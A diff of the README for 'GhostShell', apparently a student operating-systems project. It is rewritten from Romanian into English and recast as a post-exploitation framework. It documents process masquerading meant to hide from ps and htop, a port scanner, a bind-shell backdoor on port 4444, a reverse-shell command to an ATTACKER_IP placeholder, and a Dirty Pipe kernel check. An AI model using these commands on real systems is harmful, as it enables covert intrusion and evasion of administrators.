@@ -1,116 +1,96 @@
 # 👻 GhostShell
 
-Framework de Manipulare a Proceselor (OS) & Security Auditing
+## Executive Summary
 
-GhostShell este un utilitar CLI (Command Line Interface) dezvoltat pentru disciplina Sisteme de Operare. Proiectul demonstrează concepte avansate de interacțiune cu Kernel-ul Linux, manipularea memoriei proceselor și networking la nivel scăzut.
+GhostShell is a Post-Exploitation and Operating System Manipulation framework designed for Linux environments (run via Docker). Its purpose is to provide a practical demonstration of concepts such as **Defense Evasion**, **Persistence**, and **Low-level Networking**.
 
-> **Notă:** Deși este un tool de "Ethical Hacking", scopul principal este **educațional**: înțelegerea structurii proceselor (task_struct, argv) și a virtualizării.
+The application acts as a "Swiss Army Knife" for an Ethical Hacker who has already gained access to a machine and wishes to remain undetected while performing sensitive operations.
+
+## 🧩 Core Modules (CLI Commands)
+
+### 1. Evasion Module (ghost)
+**Command:** `python main.py ghost --name "nginx-worker"`
+
+*   **Function:** Activates the Process Masquerading technique.
+*   **Mechanism:** It doesn't just change the window title; it directly accesses the process memory and overwrites the command-line arguments (`argv`).
+*   **Result:** Deceives standard monitoring tools (`ps`, `top`, `htop`). An administrator will see a legitimate process (e.g., nginx) instead of a suspicious Python script.
+
+### 2. Reconnaissance Module (scan)
+**Command:** `python main.py scan 192.168.1.5 --ports 1-1000`
+
+*   **Function:** Scans for open ports on a remote target.
+*   **Mechanism:** Uses TCP Sockets (`SOCK_STREAM`) and Multi-threading to verify hundreds of ports simultaneously by analyzing the "Three-Way Handshake" response.
+*   **Result:** Identifies vulnerable services on the network without installing noisy external tools like nmap.
+
+### 3. Bind Shell Module (listen)
+**Command:** `python main.py listen --port 4444`
+
+*   **Function:** Opens a "Backdoor" on the victim's system.
+*   **Mechanism:** Creates a server socket listening on `0.0.0.0`. Any incoming connection is granted access to the command line (shell).
+*   **Limitation:** Easily detectable and blocked by firewalls that do not allow inbound connections (Inbound Rules).
+
+### 4. Reverse Shell Module (connect)
+**Command:** `python main.py connect <ATTACKER_IP> --port 4444`
+
+*   **Function:** Initiates a connection FROM the victim TO the attacker.
+*   **Mechanism:** Simulates a web client (e.g., browser) accessing the internet. Once connected, the attacker sends commands through this tunnel.
+*   **Strategic Advantage:** Bypasses most corporate/lab firewalls because outbound traffic is usually permitted.
+
+### 5. Audit Module (audit)
+**Command:** `python main.py audit`
+
+*   **Function:** Performs a quick check of the kernel's security status.
+*   **Mechanism:** Compares the current kernel version (`uname -r`) against a database of critical vulnerabilities (e.g., Dirty Pipe - CVE-2022-0847).
 
 ---
 
-## 🚀 Funcționalități Cheie
+## 🛠️ Installation & Setup
 
-### 1. 🕵️ Ghost Mode (Process Masquerading)
+The project is fully containerized. Whether you are on Windows, macOS, or Linux, the steps are identical.
 
-Ascunde identitatea procesului curent față de utilitarele standard de monitorizare (`ps`, `top`, `htop`).
+### Prerequisites
 
-**Tehnică:**
-- Nu doar schimbă numele thread-ului (`prctl`), ci suprascrie memoria alocată argumentelor liniei de comandă (`argv`) folosind biblioteca `setproctitle`.
+*   ✅ Docker Desktop installed and running
+*   ✅ Git (optional, for cloning)
 
-**Rezultat:** Transformă `python main.py` în orice proces legitim (ex: `nginx-worker`, `kworker`).
-
-### 2. 📡 Network Scanner
-
-Un scanner de porturi TCP Connect multi-threaded.
-
-- Folosește threading pentru a scana sute de porturi simultan
-- Demonstrează gestionarea concurenței și a socket-urilor Berkeley (`AF_INET`, `SOCK_STREAM`)
-
-### 3. 🛡️ Kernel Audit
-
-Verifică versiunea kernel-ului curent pentru vulnerabilități critice cunoscute, specific Dirty Pipe (CVE-2022-0847).
-
----
-
-## 🛠️ Instalare și Configurare
-
-Proiectul este containerizat complet. Nu contează dacă ești pe Windows, macOS sau Linux, pașii sunt identici.
-
-### Cerințe
-
-- ✅ Docker Desktop instalat și pornit
-- ✅ Git (opțional, pentru clonare)
-
-### Pasul 1: Clonare Repository
+### Step 1: Clone the Repository
 
 ```bash
 git clone https://github.com/MariusZmr/GhostShell.git
 cd GhostShell-Proiect-SO
 ```
 
-### Pasul 2: Pornire Mediu (Docker)
+### Step 2: Start the Environment (Docker)
 
-Această comandă va construi imaginea și va instala toate dependențele izolat.
+This command will build the image and install all dependencies in isolation.
 
 ```bash
 docker-compose up -d --build
 ```
 
-### Pasul 3: Accesare Shell
+### Step 3: Access the Shell
 
-Toate comenzile de hacking se rulează în interiorul containerului.
+All commands are executed inside the container.
 
 ```bash
 docker-compose exec ghostshell bash
 ```
 
-> Acum prompt-ul tău ar trebui să fie: `root@docker-desktop:/app#`
+> Your prompt should now be: `root@docker-desktop:/app#`
 
 ---
 
-## 💻 Utilizare
+## 🏗️ Technical Architecture
 
-Odată intrat în container, poți folosi CLI-ul `main.py`.
-
-### 👻 Activare Ghost Mode
-
-Ascunde procesul curent sub un nume fals.
-
-```bash
-python main.py ghost --name "systemd-daemon"
-```
-
-**Verificare:** Deschide un alt terminal, intră în container și rulează `ps aux`. Vei vedea procesul `systemd-daemon` rulând, nu `python`.
-
-### 📡 Scanare Rețea
-
-Scanează o țintă (IP sau domeniu) pe un interval de porturi.
-
-```bash
-python main.py scan google.com --ports 1-100 --threads 50
-```
-
-### 🛡️ Audit Kernel
-
-Verifică securitatea kernel-ului pe care rulează containerul.
-
-```bash
-python main.py audit
-```
-
----
-
-## 🏗️ Arhitectura Tehnică
-
-| Componentă | Detalii |
+| Component | Details |
 |---|---|
-| **Limbaj** | Python 3.10 |
-| **Framework CLI** | Typer + Rich (pentru UI colorat și tabele) |
-| **OS Manipulation** | `setproctitle` (C extension for Python) pentru acces la argv |
+| **Language** | Python 3.10 |
+| **CLI Framework** | Typer + Rich (for colored UI and tables) |
+| **OS Manipulation** | `setproctitle` (C extension for Python) for argv access |
 | **Infrastructure** | Docker (Debian Slim image) |
 
 ---
 
 ## ⚖️ Disclaimer
 
-Acest software a fost creat **strict în scopuri educaționale**. Autorul nu este responsabil pentru utilizarea necorespunzătoare a acestui utilitar.
+This software was created **strictly for educational purposes**. The author is not responsible for any misuse of this utility.
